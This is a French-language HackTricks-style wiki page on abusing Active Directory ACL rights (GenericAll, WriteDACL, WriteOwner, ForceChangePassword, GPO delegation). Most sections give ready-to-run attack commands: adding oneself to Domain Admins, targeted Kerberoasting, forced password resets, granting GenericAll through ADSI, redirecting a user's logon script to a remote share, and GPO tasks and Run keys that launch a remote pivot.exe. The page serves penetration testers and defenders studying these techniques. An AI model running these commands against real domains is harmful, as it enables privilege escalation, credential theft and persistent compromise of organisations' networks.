# Abuser les ACLs/ACEs d'Active Directory

{{#include ../../../banners/hacktricks-training.md}}

**Cette page est principalement un résumé des techniques de** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **et** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. Pour plus de détails, consultez les articles originaux.**

## BadSuccessor


{{#ref}}
BadSuccessor.md
{{#endref}}

## **GenericAll Rights on User**

Ce privilège accorde à un attaquant le contrôle total d'un compte utilisateur cible. Une fois les droits `GenericAll` confirmés à l'aide de la commande `Get-ObjectAcl`, un attaquant peut :

- **Changer le mot de passe de la cible** : En utilisant `net user <username> <password> /domain`, l'attaquant peut réinitialiser le mot de passe de l'utilisateur.
- **Targeted Kerberoasting** : Attribuer un SPN au compte utilisateur pour le rendre kerberoastable, puis utiliser Rubeus et targetedKerberoast.py pour extraire et tenter de craquer les hachages du ticket-granting ticket (TGT).
```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```
- **Targeted ASREPRoasting**: Désactiver la pré-authentification pour l'utilisateur, rendant son compte vulnérable à ASREPRoasting.
```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```
## **Droits GenericAll sur un groupe**

Ce privilège permet à un attaquant de manipuler les adhésions aux groupes s'il dispose des droits `GenericAll` sur un groupe comme `Domain Admins`. Après avoir identifié le nom distingué du groupe avec `Get-NetGroup`, l'attaquant peut :

- **S'ajouter au groupe `Domain Admins`** : Cela peut être fait via des commandes directes ou en utilisant des modules comme Active Directory ou PowerSploit.
```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
- Depuis Linux, vous pouvez également utiliser BloodyAD pour vous ajouter à des groupes arbitraires lorsque vous détenez GenericAll/Write membership sur ces groupes. Si le groupe cible est imbriqué dans “Remote Management Users”, vous obtiendrez immédiatement un accès WinRM sur des hôtes qui prennent en compte ce groupe:
```bash
# Linux tooling example (BloodyAD) to add yourself to a target group
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>

# If the target group is member of "Remote Management Users", WinRM becomes available
netexec winrm <dc-fqdn> -u <user> -p '<pass>'
```
## **GenericAll / GenericWrite / Write on Computer/User**

Détenir ces privilèges sur un objet ordinateur ou un compte utilisateur permet :

- **Kerberos Resource-based Constrained Delegation**: Permet de prendre le contrôle d'un objet ordinateur.
- **Shadow Credentials**: Utilisez cette technique pour vous faire passer pour un compte ordinateur ou utilisateur en exploitant les privilèges afin de créer des shadow credentials.

## **WriteProperty on Group**

Si un utilisateur dispose des droits `WriteProperty` sur tous les objets d'un groupe spécifique (par ex., `Domain Admins`), il peut :

- **Add Themselves to the Domain Admins Group**: Cela peut être réalisé en combinant les commandes `net user` et `Add-NetGroupUser`; cette méthode permet la privilege escalation au sein du domaine.
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **Self (Self-Membership) on Group**

Ce privilège permet aux attaquants de s'ajouter eux‑mêmes à des groupes spécifiques, tels que `Domain Admins`, via des commandes qui manipulent directement l'appartenance aux groupes. L'utilisation de la séquence de commandes suivante permet l'auto-ajout :
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **WriteProperty (Self-Membership)**

Un privilège similaire, il permet aux attaquants de s'ajouter directement à des groupes en modifiant les propriétés des groupes s'ils disposent du droit `WriteProperty` sur ces groupes. La confirmation et l'exécution de ce privilège s'effectuent avec :
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```
## **ForceChangePassword**

Détenir le `ExtendedRight` sur un utilisateur pour `User-Force-Change-Password` permet de réinitialiser le mot de passe sans connaître le mot de passe actuel. La vérification de ce droit et son exploitation peuvent être effectuées via PowerShell ou des outils en ligne de commande alternatifs, offrant plusieurs méthodes pour réinitialiser le mot de passe d'un utilisateur, y compris des sessions interactives et des one-liners pour des environnements non interactifs. Les commandes vont d'invocations PowerShell simples à l'utilisation de `rpcclient` sous Linux, démontrant la polyvalence des vecteurs d'attaque.
```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
## **WriteOwner on Group**

Si un attaquant découvre qu'il dispose des droits `WriteOwner` sur un groupe, il peut changer la propriété du groupe pour se l'attribuer. Cela est particulièrement impactant lorsque le groupe concerné est `Domain Admins`, car changer le propriétaire permet un contrôle plus large des attributs du groupe et de ses membres. Le processus consiste à identifier l'objet correct via `Get-ObjectAcl` puis à utiliser `Set-DomainObjectOwner` pour modifier le propriétaire, soit par SID soit par nom.
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## **GenericWrite on User**

Cette permission permet à un attaquant de modifier les propriétés d'un utilisateur. Plus précisément, avec un accès `GenericWrite`, l'attaquant peut changer le chemin du script de connexion d'un utilisateur pour exécuter un script malveillant lors de la connexion de l'utilisateur. Cela se fait en utilisant la commande `Set-ADObject` pour mettre à jour la propriété `scriptpath` de l'utilisateur ciblé afin qu'elle pointe vers le script de l'attaquant.
```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
## **GenericWrite on Group**

Avec ce privilège, les attaquants peuvent manipuler l'appartenance aux groupes, par exemple s'ajouter eux-mêmes ou ajouter d'autres utilisateurs à des groupes spécifiques. Ce processus implique de créer un objet d'identification, de l'utiliser pour ajouter ou supprimer des utilisateurs d'un groupe, et de vérifier les changements d'appartenance avec des commandes PowerShell.
```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
## **WriteDACL + WriteOwner**

Posséder un objet AD et disposer des privilèges `WriteDACL` sur celui-ci permet à un attaquant de s'accorder les privilèges `GenericAll` sur l'objet. Cela s'accomplit par manipulation ADSI, ce qui donne un contrôle total sur l'objet et la possibilité de modifier ses adhésions aux groupes. Malgré cela, des limitations existent lors de la tentative d'exploitation de ces privilèges en utilisant les cmdlets `Set-Acl` / `Get-Acl` du module Active Directory.
```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
## **Réplication sur le domaine (DCSync)**

L'attaque DCSync exploite des permissions de réplication spécifiques sur le domaine pour se faire passer pour un Domain Controller et synchroniser des données, y compris les identifiants utilisateur. Cette technique puissante nécessite des permissions comme `DS-Replication-Get-Changes`, permettant aux attaquants d'extraire des informations sensibles de l'environnement AD sans accès direct à un Domain Controller. [**Learn more about the DCSync attack here.**](../dcsync.md)

## Délégation GPO <a href="#gpo-delegation" id="gpo-delegation"></a>

### Délégation GPO

L'accès délégué pour gérer les Group Policy Objects (GPOs) peut représenter des risques de sécurité significatifs. Par exemple, si un utilisateur tel que `offense\spotless` se voit déléguer les droits de gestion des GPO, il peut disposer de privilèges comme **WriteProperty**, **WriteDacl**, et **WriteOwner**. Ces permissions peuvent être abusées à des fins malveillantes, comme identifié avec PowerView : `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

### Énumérer les permissions GPO

Pour identifier des GPO mal configurées, les cmdlets de PowerSploit peuvent être chaînées. Cela permet de découvrir les GPOs qu'un utilisateur spécifique peut gérer : `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**Ordinateurs avec une politique donnée appliquée** : Il est possible de déterminer aux quels ordinateurs une GPO spécifique s'applique, ce qui aide à comprendre l'étendue de l'impact potentiel. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**Politiques appliquées à un ordinateur donné** : Pour voir quelles politiques sont appliquées à un ordinateur particulier, on peut utiliser des commandes comme `Get-DomainGPO`.

**OUs avec une politique donnée appliquée** : Identifier les unités d'organisation (OUs) affectées par une politique donnée peut se faire avec `Get-DomainOU`.

Vous pouvez aussi utiliser l'outil [**GPOHound**](https://github.com/cogiceo/GPOHound) pour énumérer les GPOs et y trouver des problèmes.

### Abus de GPO - New-GPOImmediateTask

Des GPO mal configurées peuvent être exploitées pour exécuter du code, par exemple en créant une tâche planifiée immédiate. Cela peut servir à ajouter un utilisateur au groupe des administrateurs locaux sur les machines affectées, élevant ainsi de manière significative les privilèges :
```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
### GroupPolicy module - Abuse GPO

Le module GroupPolicy, s'il est installé, permet la création et le lien de nouveaux GPOs, et la configuration de préférences telles que des valeurs de registre pour exécuter des backdoors sur les ordinateurs affectés. Cette méthode nécessite que le GPO soit mis à jour et qu'un utilisateur se connecte à l'ordinateur pour l'exécution :
```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
### SharpGPOAbuse - Abuse GPO

SharpGPOAbuse propose une méthode pour abuser des GPOs existants en ajoutant des tâches ou en modifiant des paramètres sans avoir besoin de créer de nouveaux GPOs. Cet outil nécessite la modification de GPOs existants ou l'utilisation des outils RSAT pour en créer de nouveaux avant d'appliquer les modifications:
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### Forcer la mise à jour des GPO

Les mises à jour des GPO ont généralement lieu environ toutes les 90 minutes. Pour accélérer ce processus, notamment après avoir effectué un changement, la commande `gpupdate /force` peut être utilisée sur l'ordinateur cible pour forcer une mise à jour immédiate des stratégies. Cette commande garantit que toute modification des GPO est appliquée sans attendre le prochain cycle de mise à jour automatique.

### Dans les coulisses

En inspectant les tâches planifiées (Scheduled Tasks) d'un GPO donné, comme la `Misconfigured Policy`, on peut confirmer l'ajout de tâches telles que `evilTask`. Ces tâches sont créées via des scripts ou des outils en ligne de commande visant à modifier le comportement du système ou à escalader les privilèges.

La structure de la tâche, telle qu'elle apparaît dans le fichier de configuration XML généré par `New-GPOImmediateTask`, décrit les détails de la tâche planifiée — y compris la commande à exécuter et ses déclencheurs. Ce fichier représente la manière dont les tâches planifiées sont définies et gérées au sein des GPO, offrant un moyen d'exécuter des commandes ou scripts arbitraires dans le cadre de l'application des stratégies.

### Utilisateurs et groupes

Les GPO permettent également de manipuler les membres des utilisateurs et des groupes sur les systèmes ciblés. En modifiant directement les fichiers de stratégie Utilisateurs et groupes, un attaquant peut ajouter des utilisateurs à des groupes privilégiés, comme le groupe local `administrators`. Cela est rendu possible par la délégation des permissions de gestion des GPO, qui permet de modifier les fichiers de stratégie pour inclure de nouveaux utilisateurs ou changer les appartenances aux groupes.

Le fichier de configuration XML pour Utilisateurs et groupes décrit comment ces changements sont implémentés. En ajoutant des entrées à ce fichier, des utilisateurs spécifiques peuvent se voir accorder des privilèges élevés sur les systèmes affectés. Cette méthode offre une approche directe d'escalade de privilèges via la manipulation des GPO.

De plus, d'autres méthodes pour exécuter du code ou maintenir la persistance, comme l'utilisation de scripts de logon/logoff, la modification de clés de registre pour les autoruns, l'installation de logiciels via des fichiers `.msi`, ou la modification des configurations de services, peuvent aussi être envisagées. Ces techniques offrent différentes voies pour maintenir l'accès et contrôler les systèmes cibles via l'abus des GPO.

## Références

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [https://wald0.com/?p=112](https://wald0.com/?p=112)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule\_\_ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType\_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)

{{#include ../../../banners/hacktricks-training.md}}
